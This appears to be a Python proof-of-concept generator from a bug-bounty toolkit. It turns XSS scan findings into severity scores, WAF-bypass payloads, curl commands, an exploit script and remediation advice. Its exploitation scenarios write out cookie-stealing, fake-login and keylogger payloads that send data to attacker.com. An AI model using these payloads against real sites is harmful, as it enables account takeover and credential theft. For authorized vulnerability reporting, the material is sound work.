#!/usr/bin/env python3
"""
🦊 SHADOWFOX ADVANCED POC GENERATOR
Analizira agent_x_results.json i kreira HIGH severity PoC
Autor: Whitefox980 | Verzija: 2025.06.06
"""

import json
import time
import base64
import urllib.parse
from datetime import datetime
import requests
import warnings
warnings.filterwarnings("ignore")

class AdvancedPoCGenerator:
    def __init__(self):
        self.agent_results = {}
        self.meta_config = {}
        self.advanced_poc = {
            "vulnerability_info": {},
            "advanced_payloads": [],
            "impact_analysis": {},
            "exploitation_scenarios": [],
            "remediation": {},
            "cvss_calculation": {},
            "business_impact": {},
            "proof_files": []
        }
        
    def load_agent_results(self):
        """Učitava rezultate iz AdvanceNapad/agent_x_results.json"""
        try:
            with open('AdvanceNapad/prototype_pollution_results.json', 'r') as f:
                self.agent_results = json.load(f)
            print(f"🧠 [LOAD] Agent X rezultati učitani: {len(self.agent_results.get('vulnerabilities', []))} ranjivosti")
            return True
        except FileNotFoundError:
            print("❌ [ERROR] AdvanceNapad/agent_x_results.json nije pronađen!")
            return False
        except Exception as e:
            print(f"❌ [ERROR] Greška pri učitavanju: {str(e)}")
            return False
            
    def load_meta_config(self):
        """Učitava Meta konfiguraciju"""
        try:
            with open('Meta/mission_info.json', 'r') as f:
                self.meta_config = json.load(f)
            return True
        except:
            print("⚠️  [WARNING] Meta config nije dostupan")
            return False
            
    def analyze_vulnerability_severity(self, vuln_data):
        """Napredna analiza severity-ja ranjivosti"""
        base_severity = vuln_data.get('severity', 'Medium').lower()
        vuln_type = vuln_data.get('vulnerability_type', '').lower()
        
        # Faktori koji povećavaju severity
        severity_multipliers = {
            'reflected_xss': {
                'base_score': 6.1,
                'factors': {
                    'no_httponly_cookie': +1.2,
                    'no_csrf_protection': +0.8,
                    'admin_functionality': +1.5,
                    'user_data_access': +1.0,
                    'bypasses_waf': +0.7
                }
            },
            'stored_xss': {
                'base_score': 8.8,
                'factors': {
                    'affects_all_users': +0.5,
                    'admin_panel': +1.0
                }
            },
            'sql_injection': {
                'base_score': 9.0,
                'factors': {
                    'data_extraction': +0.8,
                    'authentication_bypass': +1.0
                }
            }
        }
        
        # Analiza na osnovu payload-a i response-a
        payloads = vuln_data.get('successful_payloads', [])
        responses = vuln_data.get('response_indicators', [])
        
        calculated_score = 6.1  # Default Medium
        impact_factors = []
        
        # Specifična analiza za XSS
        if 'xss' in vuln_type:
            calculated_score = severity_multipliers['reflected_xss']['base_score']
            
            # Proveri faktore koji povećavaju impact
            for payload in payloads[:3]:  # Analiziraj top 3 payload-a
                payload_text = payload.get('payload', '').lower()
                
                if 'document.cookie' in payload_text:
                    calculated_score += 0.8
                    impact_factors.append("Cookie extraction capability")
                    
                if 'fetch(' in payload_text or 'xmlhttprequest' in payload_text:
                    calculated_score += 0.7
                    impact_factors.append("AJAX request capability")
                    
                if 'eval(' in payload_text:
                    calculated_score += 0.5
                    impact_factors.append("Code execution capability")
                    
            # Analiza Response header-a
            headers = vuln_data.get('response_headers', {})
            if not headers.get('Set-Cookie', '').lower().count('httponly'):
                calculated_score += 1.2
                impact_factors.append("Missing HttpOnly cookie protection")
                
            if not headers.get('X-Frame-Options'):
                calculated_score += 0.3
                impact_factors.append("Missing X-Frame-Options")
                
            if not headers.get('Content-Security-Policy'):
                calculated_score += 0.5
                impact_factors.append("Missing Content Security Policy")
        
        # Određi finalni severity rating
        if calculated_score >= 9.0:
            final_severity = "Critical"
        elif calculated_score >= 7.0:
            final_severity = "High"
        elif calculated_score >= 4.0:
            final_severity = "Medium"
        else:
            final_severity = "Low"
            
        return {
            "calculated_score": round(calculated_score, 1),
            "final_severity": final_severity,
            "impact_factors": impact_factors,
            "original_severity": base_severity
        }
        
    def generate_waf_bypass_payloads(self, original_payload):
        """Generiše napredne WAF bypass payload-e"""
        bypass_techniques = [
            # HTML encoding variations
            {
                "name": "HTML Entity Encoding",
                "payload": original_payload.replace('<', '&lt;').replace('>', '&gt;'),
                "description": "HTML entity encoding to bypass basic filters"
            },
            # URL encoding variations
            {
                "name": "Double URL Encoding", 
                "payload": urllib.parse.quote(urllib.parse.quote(original_payload)),
                "description": "Double URL encoding bypass"
            },
            # Unicode variations
            {
                "name": "Unicode Bypass",
                "payload": original_payload.replace('<script>', '<＜script＞'),
                "description": "Unicode homograph bypass"
            },
            # Case variations
            {
                "name": "Mixed Case Bypass",
                "payload": self.randomize_case(original_payload),
                "description": "Random case variation"
            },
            # Fragment variations
            {
                "name": "Fragmented Payload",
                "payload": original_payload.replace('script', 'scr'+'ipt'),
                "description": "String fragmentation"
            },
            # Event handler variations
            {
                "name": "Event Handler Bypass",
                "payload": '<img src=x onerror="alert(\'ShadowFox-Advanced\')">', 
                "description": "Event handler based XSS"
            },
            # SVG-based bypass
            {
                "name": "SVG Vector",
                "payload": '<svg onload="alert(\'ShadowFox-SVG\')">', 
                "description": "SVG-based XSS vector"
            }
        ]
        
        return bypass_techniques
        
    def randomize_case(self, text):
        """Randomizuje case za bypass"""
        import random
        result = ""
        for char in text:
            if char.isalpha():
                result += char.upper() if random.choice([True, False]) else char.lower()
            else:
                result += char
        return result
        
    def generate_exploitation_scenarios(self, vuln_data):
        """Generiše realne scenarije eksploatacije"""
        scenarios = []
        vuln_type = vuln_data.get('vulnerability_type', '').lower()
        target_url = vuln_data.get('url', '')
        
        if 'xss' in vuln_type:
            scenarios.extend([
                {
                    "scenario": "Session Hijacking",
                    "description": "Attacker steals user session cookies",
                    "steps": [
                        "1. Craft malicious URL with XSS payload",
                        "2. Send to victim via social engineering",
                        "3. Victim clicks link, JavaScript executes",
                        "4. Session cookie sent to attacker server",
                        "5. Attacker impersonates victim"
                    ],
                    "payload": f"<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>",
                    "impact": "Complete account takeover"
                },
                {
                    "scenario": "Credential Harvesting",
                    "description": "Inject fake login form to steal credentials",
                    "steps": [
                        "1. Inject JavaScript that creates fake login overlay",
                        "2. User enters credentials thinking it's legitimate",
                        "3. Credentials sent to attacker server",
                        "4. User redirected to real page"
                    ],
                    "payload": f"<script>document.body.innerHTML='<form action=\"https://attacker.com/harvest\" method=\"post\">Username:<input name=\"u\">Password:<input name=\"p\" type=\"password\"><button>Login</button></form>'</script>",
                    "impact": "Account compromise"
                },
                {
                    "scenario": "Keylogger Injection",
                    "description": "Inject keylogger to capture all user input",
                    "steps": [
                        "1. Inject keylogger JavaScript",
                        "2. Monitor all keyboard input",
                        "3. Send captured data to attacker",
                        "4. Capture passwords, PINs, sensitive data"
                    ],
                    "payload": f"<script>document.addEventListener('keypress',function(e){{fetch('https://attacker.com/log?k='+e.key)}})</script>",
                    "impact": "Complete data interception"
                }
            ])
            
        return scenarios
        
    def calculate_business_impact(self, vuln_data, severity_analysis):
        """Kalkulacija business impact-a"""
        base_impact = {
            "financial_risk": "Medium",
            "reputational_damage": "Medium", 
            "compliance_risk": "Low",
            "operational_impact": "Low"
        }
        
        severity = severity_analysis['final_severity'].lower()
        vuln_type = vuln_data.get('vulnerability_type', '').lower()
        
        # Povećaj impact na osnovu severity-ja
        if severity in ['high', 'critical']:
            base_impact["financial_risk"] = "High"
            base_impact["reputational_damage"] = "High"
            base_impact["compliance_risk"] = "Medium"
            
        # Specifični impact za XSS
        if 'xss' in vuln_type:
            impact_details = {
                "data_breach_potential": "High - Session hijacking possible",
                "user_trust_impact": "High - Users may lose confidence",
                "regulatory_compliance": "Medium - May violate data protection laws",
                "estimated_cost": "$10,000 - $50,000 in remediation and potential fines"
            }
            base_impact.update(impact_details)
            
        return base_impact
        
    def generate_remediation_plan(self, vuln_data):
        """Generiše detaljni plan remediation-a"""
        vuln_type = vuln_data.get('vulnerability_type', '').lower()
        
        remediation = {
            "immediate_actions": [],
            "short_term_fixes": [],
            "long_term_improvements": [],
            "verification_steps": []
        }
        
        if 'xss' in vuln_type:
            remediation.update({
                "immediate_actions": [
                    "Implement input validation for search parameters",
                    "Enable Content Security Policy (CSP)",
                    "Add HttpOnly flag to session cookies"
                ],
                "short_term_fixes": [
                    "Implement proper output encoding/escaping",
                    "Add X-Frame-Options header",
                    "Configure X-XSS-Protection header",
                    "Sanitize all user inputs server-side"
                ],
                "long_term_improvements": [
                    "Implement Web Application Firewall (WAF)",
                    "Regular security code reviews",
                    "Automated security testing in CI/CD",
                    "Security awareness training for developers"
                ],
                "verification_steps": [
                    "Test with original payload - should be blocked",
                    "Test with various bypass techniques",
                    "Verify CSP headers are present",
                    "Confirm input validation is working"
                ]
            })
            
        return remediation
        
    def create_proof_files(self, vuln_data, advanced_payloads):
        """Kreira proof fajlove za demonstraciju"""
        proof_files = []
        
        # 1. HTML PoC file
        html_poc = self.generate_html_poc(vuln_data, advanced_payloads)
        proof_files.append({
            "filename": "ShadowFox_XSS_PoC.html",
            "content": html_poc,
            "description": "Interactive HTML proof of concept"
        })
        
        # 2. cURL commands
        curl_commands = self.generate_curl_commands(vuln_data, advanced_payloads)
        proof_files.append({
            "filename": "ShadowFox_Curl_Commands.txt",
            "content": curl_commands,
            "description": "Command line reproduction steps"
        })
        
        # 3. Python exploit script
        python_exploit = self.generate_python_exploit(vuln_data)
        proof_files.append({
            "filename": "ShadowFox_Exploit.py",
            "content": python_exploit,
            "description": "Automated exploitation script"
        })
        
        return proof_files
        
    def generate_html_poc(self, vuln_data, advanced_payloads):
        """Generiše HTML PoC file"""
        target_url = vuln_data.get('url', '')
        
        html_content = f"""<!DOCTYPE html>
<html>
<head>
    <title>ShadowFox XSS Proof of Concept</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; }}
        .payload {{ background: #f0f0f0; padding: 10px; margin: 10px 0; border-radius: 5px; }}
        .dangerous {{ color: red; font-weight: bold; }}
        .button {{ background: #007cba; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; }}
    </style>
</head>
<body>
    <h1>🦊 ShadowFox XSS Proof of Concept</h1>
    <p><strong>Target:</strong> {target_url}</p>
    <p><strong>Vulnerability Type:</strong> {vuln_data.get('vulnerability_type', 'XSS')}</p>
    
    <h2>Test Payloads</h2>
"""
        
        for i, payload_info in enumerate(advanced_payloads[:5]):
            payload = payload_info['payload']
            encoded_payload = urllib.parse.quote(payload)
            test_url = f"{target_url.split('?')[0]}?q={encoded_payload}"
            
            html_content += f"""
    <div class="payload">
        <h3>Payload {i+1}: {payload_info['name']}</h3>
        <p><strong>Payload:</strong> <code>{payload}</code></p>
        <p><strong>Description:</strong> {payload_info['description']}</p>
        <p><strong>Test URL:</strong> <a href="{test_url}" target="_blank" class="dangerous">⚠️ CLICK TO TEST (DANGEROUS)</a></p>
        <button class="button" onclick="navigator.clipboard.writeText('{test_url}')">Copy URL</button>
    </div>
"""
        
        html_content += """
    <h2>⚠️ WARNING</h2>
    <p class="dangerous">This is a proof of concept for authorized security testing only. 
    Do not use against systems you do not own or have explicit permission to test.</p>
    
    <p><em>Generated by ShadowFox Elite Ethical Squad</em></p>
</body>
</html>"""
        
        return html_content
        
    def generate_curl_commands(self, vuln_data, advanced_payloads):
        """Generiše cURL komande za reprodukciju"""
        commands = "# ShadowFox cURL Reproduction Commands\n"
        commands += f"# Target: {vuln_data.get('url', '')}\n"
        commands += f"# Vulnerability: {vuln_data.get('vulnerability_type', 'XSS')}\n\n"
        
        base_url = vuln_data.get('url', '').split('?')[0]
        
        for i, payload_info in enumerate(advanced_payloads[:5]):
            payload = payload_info['payload']
            commands += f"# Payload {i+1}: {payload_info['name']}\n"
            commands += f'curl -X GET "{base_url}?q={urllib.parse.quote(payload)}" \\\n'
            commands += f'  -H "User-Agent: ShadowFox-PoC/1.0" \\\n'
            commands += f'  -H "Accept: text/html,application/xhtml+xml" \\\n'
            commands += f'  --insecure -v\n\n'
            
        return commands
        
    def generate_python_exploit(self, vuln_data):
        """Generiše Python exploit script"""
        script = f'''#!/usr/bin/env python3
"""
ShadowFox Automated XSS Exploit
Target: {vuln_data.get('url', '')}
Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
"""

import requests
import urllib.parse
import time

class ShadowFoxExploit:
    def __init__(self):
        self.target_url = "{vuln_data.get('url', '').split('?')[0]}"
        self.session = requests.Session()
        self.session.verify = False
        
    def test_payload(self, payload, description=""):
        """Test single XSS payload"""
        params = {{'q': payload}}
        
        try:
            response = self.session.get(self.target_url, params=params)
            
            if payload.replace('<', '&lt;').replace('>', '&gt;') not in response.text and payload in response.text:
                print(f"✅ [SUCCESS] {{description}}")
                print(f"🎯 [PAYLOAD] {{payload}}")
                print(f"🔗 [URL] {{response.url}}")
                return True
            else:
                print(f"❌ [FAILED] {{description}}")
                return False
                
        except Exception as e:
            print(f"⚠️  [ERROR] {{str(e)}}")
            return False
            
    def run_exploit(self):
        """Run complete exploit test"""
        print("🦊 ShadowFox XSS Exploit Starting...")
        
        test_payloads = [
            ('<script>alert("ShadowFox-XSS")</script>', 'Basic XSS'),
            ('<img src=x onerror="alert(\\'ShadowFox\\')">', 'IMG XSS'),
            ('<svg onload="alert(\\'ShadowFox\\')">', 'SVG XSS'),
        ]
        
        successful = 0
        for payload, desc in test_payloads:
            if self.test_payload(payload, desc):
                successful += 1
            time.sleep(1)
            
        print(f"\\n📊 Results: {{successful}}/{{len(test_payloads)}} payloads successful")

if __name__ == "__main__":
    exploit = ShadowFoxExploit()
    exploit.run_exploit()
'''
        return script
        
    def generate_advanced_poc_report(self):
        """Glavna funkcija za generisanje naprednog PoC report-a"""
        print("🦊 SHADOWFOX ADVANCED POC GENERATOR - POKRETANJE")
        print("=" * 60)
        
        # 1. Učitaj podatke
        if not self.load_agent_results():
            return False
            
        self.load_meta_config()
        
        # 2. Analiziraj svaku ranjivost
        for vuln_data in self.agent_results.get('vulnerabilities', []):
            print(f"\n🎯 [ANALYZE] {vuln_data.get('vulnerability_type', 'Unknown')}")
            
            # Severity analiza
            severity_analysis = self.analyze_vulnerability_severity(vuln_data)
            
            # Generiši napredne payload-e
            original_payload = vuln_data.get('successful_payloads', [{}])[0].get('payload', '<script>alert(1)</script>')
            advanced_payloads = self.generate_waf_bypass_payloads(original_payload)
            
            # Exploitation scenarios
            scenarios = self.generate_exploitation_scenarios(vuln_data)
            
            # Business impact
            business_impact = self.calculate_business_impact(vuln_data, severity_analysis)
            
            # Remediation plan
            remediation = self.generate_remediation_plan(vuln_data)
            
            # Proof files
            proof_files = self.create_proof_files(vuln_data, advanced_payloads)
            
            # Kompajliraj sve u advanced_poc
            vulnerability_report = {
                "vulnerability_info": {
                    "type": vuln_data.get('vulnerability_type', ''),
                    "url": vuln_data.get('url', ''),
                    "parameter": vuln_data.get('parameter', ''),
                    "original_severity": vuln_data.get('severity', ''),
                    "calculated_severity": severity_analysis['final_severity'],
                    "cvss_score": severity_analysis['calculated_score'],
                    "discovery_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                },
                "severity_analysis": severity_analysis,
                "advanced_payloads": advanced_payloads,
                "exploitation_scenarios": scenarios,
                "business_impact": business_impact,
                "remediation": remediation,
                "proof_files": proof_files
            }
            
            self.advanced_poc = vulnerability_report
            break  # Analiziraj prvu ranjivost za sada
            
        # 3. Snimi rezultate
        self.save_advanced_report()
        self.create_proof_files_on_disk()
        
        return True
        
    def save_advanced_report(self):
        """Snima napredni PoC report"""
        try:
            # JSON report
            with open('PoC/AdvancedPoC_Report.json', 'w') as f:
                json.dump(self.advanced_poc, f, indent=2, ensure_ascii=False)
                
            print("💾 [SAVE] AdvancedPoC_Report.json created")
            
            # Human-readable summary
            self.create_human_readable_report()
            
        except Exception as e:
            print(f"❌ [SAVE ERROR] {str(e)}")
            
    def create_human_readable_report(self):
        """Kreira čitljiv report za ljudi"""
        report = f"""
🦊 SHADOWFOX ADVANCED VULNERABILITY REPORT
{'='*60}

VULNERABILITY SUMMARY
• Type: {self.advanced_poc['vulnerability_info']['type']}
• Target: {self.advanced_poc['vulnerability_info']['url']}
• Parameter: {self.advanced_poc['vulnerability_info']['parameter']}
• Original Severity: {self.advanced_poc['vulnerability_info']['original_severity']}
• Calculated Severity: {self.advanced_poc['vulnerability_info']['calculated_severity']}
• CVSS Score: {self.advanced_poc['vulnerability_info']['cvss_score']}

IMPACT FACTORS
"""
        for factor in self.advanced_poc['severity_analysis']['impact_factors']:
            report += f"• {factor}\n"
            
        report += f"""
BUSINESS IMPACT
• Financial Risk: {self.advanced_poc['business_impact']['financial_risk']}
• Reputational Damage: {self.advanced_poc['business_impact']['reputational_damage']}
• Compliance Risk: {self.advanced_poc['business_impact']['compliance_risk']}

EXPLOITATION SCENARIOS
"""
        for scenario in self.advanced_poc['exploitation_scenarios']:
            report += f"\n{scenario['scenario']}:\n{scenario['description']}\nImpact: {scenario['impact']}\n"
            
        report += f"""

REMEDIATION PRIORITY
Immediate Actions:
"""
        for action in self.advanced_poc['remediation']['immediate_actions']:
            report += f"• {action}\n"
            
        report += f"""
Generated by: ShadowFox Elite Ethical Squad
Contact: H1:Whitefox980
Date: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
"""
        
        with open('PoC/AdvancedPoC_Report.txt', 'w') as f:
            f.write(report)
            
        print("📄 [SAVE] AdvancedPoC_Report.txt created")
        
    def create_proof_files_on_disk(self):
        """Kreira proof fajlove na disku"""
        try:
            for proof_file in self.advanced_poc['proof_files']:
                filename = f"PoC/{proof_file['filename']}"
                with open(filename, 'w') as f:
                    f.write(proof_file['content'])
                print(f"📁 [SAVE] {filename}")
        except Exception as e:
            print(f"❌ [PROOF FILES ERROR] {str(e)}")

def main():
    generator = AdvancedPoCGenerator()
    generator.generate_advanced_poc_report()

if __name__ == "__main__":
    main()
